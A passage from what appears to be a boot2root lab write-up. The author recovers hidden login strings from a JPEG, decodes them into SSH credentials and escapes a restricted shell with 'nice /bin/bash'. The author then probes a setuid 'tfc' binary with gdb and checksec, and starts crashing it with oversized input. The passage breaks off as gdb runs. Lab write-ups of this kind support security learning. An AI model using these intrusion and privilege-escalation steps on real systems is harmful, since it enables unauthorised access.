</span><span class='line'>Saving to: <span class="sb">`</span>knockknock.jpg<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[============&gt;] 84,741      68.2K/s   in 1.2s    </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-14 13:04:35 (68.2 KB/s) - `knockknock.jpg&#39;</span> saved <span class="o">[</span>84741/84741<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>

<p>Next, I ran the image through exiftool:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
</span><span class='line'>ExifTool Version Number         : 8.60
</span><span class='line'>File Name                       : knockknock.jpg
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 83 kB
</span><span class='line'>File Modification Date/Time     : 2014:10:06 18:38:30+02:00
</span><span class='line'>File Permissions                : rw-r--r--
</span><span class='line'>File Type                       : JPEG
</span><span class='line'>MIME Type                       : image/jpeg
</span><span class='line'>JFIF Version                    : 1.02
</span><span class='line'>Resolution Unit                 : None
</span><span class='line'>X Resolution                    : 100
</span><span class='line'>Y Resolution                    : 100
</span><span class='line'>Quality                         : 74%
</span><span class='line'>XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
</span><span class='line'>Marked                          : © Estate of Roy Lichtenstein
</span><span class='line'>Web Statement                   : © Estate of Roy Lichtenstein
</span><span class='line'>Rights                          : © Estate of Roy Lichtenstein
</span><span class='line'>DCT Encode Version              : 100
</span><span class='line'>APP14 Flags 0                   : <span class="o">[</span>14<span class="o">]</span>, Encoded with <span class="nv">Blend</span><span class="o">=</span>1 downsampling
</span><span class='line'>APP14 Flags 1                   : <span class="o">(</span>none<span class="o">)</span>
</span><span class='line'>Color Transform                 : YCbCr
</span><span class='line'>Image Width                     : 650
</span><span class='line'>Image Height                    : 788
</span><span class='line'>Encoding Process                : Baseline DCT, Huffman coding
</span><span class='line'>Bits Per Sample                 : 8
</span><span class='line'>Color Components                : 3
</span><span class='line'>Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
</span><span class='line'>Image Size                      : 650x788
</span></code></pre></td></tr></table></div></figure>


<p>Roy Lichtenstein. The artist of the knock knock image?
Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>

<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># extract the jpeg data</span>
</span><span class='line'>root@kali:~# recoverjpeg knockknock.jpg
</span><span class='line'>Restored 1 picture
</span><span class='line'>
</span><span class='line'><span class="c"># the output image from the extract</span>
</span><span class='line'>root@kali:~# ls image00000.jpg
</span><span class='line'>image00000.jpg
</span><span class='line'>
</span><span class='line'><span class="c"># the cmp</span>
</span><span class='line'>root@kali:~# cmp image00000.jpg knockknock.jpg
</span><span class='line'>cmp: EOF on image00000.jpg
</span></code></pre></td></tr></table></div></figure>


<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tail -n 1 image00000.jpg
</span><span class='line'>9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9<span class="sb">`</span>��5BV<span class="o">(</span>��&lt;�t�WS�����1h
</span><span class='line'>                                                         ��<span class="se">\�</span>��z<span class="nv">$�</span>��vB��
</span></code></pre></td></tr></table></div></figure>


<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# tail -n 4 knockknock.jpg
</span><span class='line'>⭚<span class="p">|</span>U���b��<span class="o">[</span>�k<span class="p">|</span>U�������+<span class="se">\U</span>����<span class="o">]</span>�U¸��qW<span class="p">|</span>U�<span class="o">]</span>�qWX�F��*��kz����<span class="o">]</span>��ѭqV�k튷�P���b��T�<span class="se">\+\U</span>��Wo��9b�&lt;�V��<span class="o">]</span>���B��<span class="o">[</span>�v*�Uثx�X�x�<span class="o">[</span>����o������<span class="p">|</span>U����v*�^��x��Wb�o���b��b��<span class="o">[</span>����qU����צ*����*���qW�
</span><span class='line'>Login Credentials
</span><span class='line'>abfnW
</span><span class='line'>sax2Cw9Ow
</span></code></pre></td></tr></table></div></figure>


<p>Hah! Login Credentials sound very promising!! :)</p>

<h2>ceasar opens the door</h2>

<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>

<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>

<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;abfnW&quot;.decode(&quot;rot13&quot;)&#39;</span>
</span><span class='line'>nosaJ
</span></code></pre></td></tr></table></div></figure>


<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;sax2Cw9Ow&quot;.decode(&quot;rot13&quot;)&#39;</span>
</span><span class='line'>fnk2Pj9Bj
</span></code></pre></td></tr></table></div></figure>


<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># username</span>
</span><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;abfnW&quot;.decode(&quot;rot13&quot;)[::-1].lower()&#39;</span>
</span><span class='line'>jason
</span><span class='line'>
</span><span class='line'><span class="c"># password</span>
</span><span class='line'>root@kali:~# python -c <span class="s1">&#39;print &quot;sax2Cw9Ow&quot;.decode(&quot;rot13&quot;)[::-1]&#39;</span>
</span><span class='line'>jB9jP2knf
</span></code></pre></td></tr></table></div></figure>


<p>So to get our first shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/knock-knock# ssh jason@192.168.56.203
</span><span class='line'>jason@192.168.56.203<span class="err">&#39;</span>s password:
</span><span class='line'>
</span><span class='line'>Linux knockknock 3.2.0-4-486 <span class="c">#1 Debian 3.2.60-1+deb7u3 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have new mail.
</span><span class='line'>Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
</span><span class='line'>jason@knockknock:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<h2>no rbash, just no</h2>

<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>-rbash: /dev/null: restricted: cannot redirect output
</span><span class='line'>-rbash: /dev/null: restricted: cannot redirect output
</span></code></pre></td></tr></table></div></figure>


<p>Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>

<h2>tiny file crypter</h2>

<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -lah
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
</span><span class='line'>drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
</span><span class='line'>lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
</span><span class='line'>-rw-r--r-- 1 jason jason 3.4K Sep 25 21:58 .bashrc
</span><span class='line'>-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
</span><span class='line'>-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
</span><span class='line'>-rw------- 1 jason jason 2.4K Oct 11 18:42 .viminfo
</span><span class='line'>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc
</span><span class='line'>_______________________________
</span><span class='line'><span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\ </span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
</span><span class='line'>  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
</span><span class='line'>                <span class="se">\/</span>            <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>    Tiny File Crypter - 1.0
</span><span class='line'>
</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
</span><span class='line'>jason@knockknock:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>

<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>

<p>A sample encryption run can be seen as:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># we have a source document</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>cat test.tfc
</span><span class='line'>This is a <span class="nb">test </span>document.
</span><span class='line'>
</span><span class='line'><span class="c"># we run the encryption program over it</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc test.tfc crypt.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'><span class="c"># dump the encrypted file as hex. from the ascii we</span>
</span><span class='line'><span class="c"># can see its no longer human readable</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>xxd crypt.tfc
</span><span class='line'>0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..<span class="err">&quot;</span><span class="p">&amp;</span>..@^.jm
</span><span class='line'>0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j
</span><span class='line'>
</span><span class='line'><span class="c"># the resulting file is owned by root</span>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>ls -l crypt.tfc
</span><span class='line'>-rw-r--r-- 1 root jason 25 Oct 14 08:12 crypt.tfc
</span></code></pre></td></tr></table></div></figure>


<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>./tfc crypt.tfc reversed.tfc
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'>
</span><span class='line'>jason@knockknock:~<span class="nv">$ </span>cat reversed.tfc
</span><span class='line'>This is a <span class="nb">test </span>document.
</span></code></pre></td></tr></table></div></figure>


<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>

<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>

<h2>fuzzing &amp; disassembling tfc</h2>

<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>

<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>strings tfc
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'>    Tiny File Crypter - 1.0
</span><span class='line'>Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
</span><span class='line'>&gt;&gt; Filenames need a .tfc extension
</span><span class='line'>&gt;&gt; No symbolic links!
</span><span class='line'>&gt;&gt; Failed to open input file
</span><span class='line'>&gt;&gt; Failed to create the output file
</span><span class='line'>&gt;&gt; File crypted, goodbye!
</span><span class='line'><span class="p">;</span>*2<span class="nv">$&quot;</span>
</span><span class='line'>_______________________________
</span><span class='line'><span class="se">\_</span>_    ___/<span class="se">\_</span>   _____/<span class="se">\_</span>   ___ <span class="se">\ </span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>    __<span class="o">)</span>  /    <span class="se">\ </span> <span class="se">\/</span>
</span><span class='line'>  <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>     <span class="se">\ </span>  <span class="se">\ </span>    <span class="se">\_</span>___
</span><span class='line'>  <span class="p">|</span>____<span class="p">|</span>    <span class="se">\_</span>__  /    <span class="se">\_</span>_____  /
</span><span class='line'>                <span class="se">\/</span>            <span class="se">\/</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>

<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>disass main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>   0x08048924 &lt;+0&gt;: push   ebp
</span><span class='line'>   0x08048925 &lt;+1&gt;: mov    ebp,esp
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x0804894e &lt;+42&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x08048951 &lt;+45&gt;:    call   0x80486e6 &lt;cryptFile&gt;    <span class="c">#&lt;---</span>
</span><span class='line'>   0x08048956 &lt;+50&gt;:    <span class="nb">test   </span>eax,eax
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x0804896c &lt;+72&gt;:    ret
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>disass cryptFile
</span><span class='line'>Dump of assembler code <span class="k">for function </span>cryptFile:
</span><span class='line'>   0x080486e6 &lt;+0&gt;: push   ebp
</span><span class='line'>   0x080486e7 &lt;+1&gt;: mov    ebp,esp
</span><span class='line'>   0x080486e9 &lt;+3&gt;: sub    esp,0x1088
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x080488a8 &lt;+450&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x080488ab &lt;+453&gt;:   call   0x8048618 &lt;xcrypt&gt;       <span class="c">#&lt;---</span>
</span><span class='line'>   0x080488b0 &lt;+458&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x14<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   <span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>   0x08048922 &lt;+572&gt;:   leave
</span><span class='line'>   0x08048923 &lt;+573&gt;:   ret
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p><code>crytFile</code> does some internal <em>things</em> (like <code>call   0x80484a0 &lt;open@plt&gt;</code> opening the file?) and eventually calls a function <code>xcrypt</code>. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of <code>xor</code> calls it had. Of course, this is only a guess and I may have missed something else completely.</p>

<p>I also checked out the security features this binary was compiled with:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : disabled
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>Woa. <strong>No</strong> security? Ok&hellip;</p>

<h2>we knocked and tfc opened the door to bof</h2>

<p>The disassembly of <code>tfc</code> did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)</p>

<p>So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># create a file of roughly 2MB</span>
</span><span class='line'>root@kali:~# dd <span class="k">if</span><span class="o">=</span>/dev/urandom <span class="nv">of</span><span class="o">=</span>large.tfc <span class="nv">bs</span><span class="o">=</span>1M <span class="nv">count</span><span class="o">=</span>2
</span><span class='line'>2+0 records in
</span><span class='line'>2+0 records out
</span><span class='line'>2097152 bytes <span class="o">(</span>2.1 MB<span class="o">)</span> copied, 0.132812 s, 15.8 MB/s
</span><span class='line'>
</span><span class='line'><span class="c"># confirm the size of the file</span>
</span><span class='line'>root@kali:~# ls -lh large.tfc
</span><span class='line'>-rw-r--r-- 1 root root 2.0M Oct 14 15:01 large.tfc
</span><span class='line'>
</span><span class='line'><span class="c"># check how many characters we have in the file</span>
</span><span class='line'>root@kali:~# wc -c large.tfc
</span><span class='line'>2097152 large.tfc
</span><span class='line'>
</span><span class='line'><span class="c"># attempt encryption</span>
</span><span class='line'>root@kali:~# ./tfc large.tfc out.tfc
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p><em>Segmentation fault</em>! Being able to crash <code>tfc</code> is really good news. I went on to test just how many characters were needed to crash <code>tfc</code> in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in <code>gdb</code>. I first prepared a new file with just &ldquo;A&rdquo; in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="nb">echo</span> -n <span class="k">$(</span>python -c <span class="s1">&#39;print &quot;A&quot;*6000&#39;</span><span class="k">)</span> &gt; gdb-test.tfc
</span></code></pre></td></tr></table></div></figure>


<p>And continued to run it in <code>gdb</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r gdb-test.tfc gdb-test-out.tfc
</span><span class='line'>
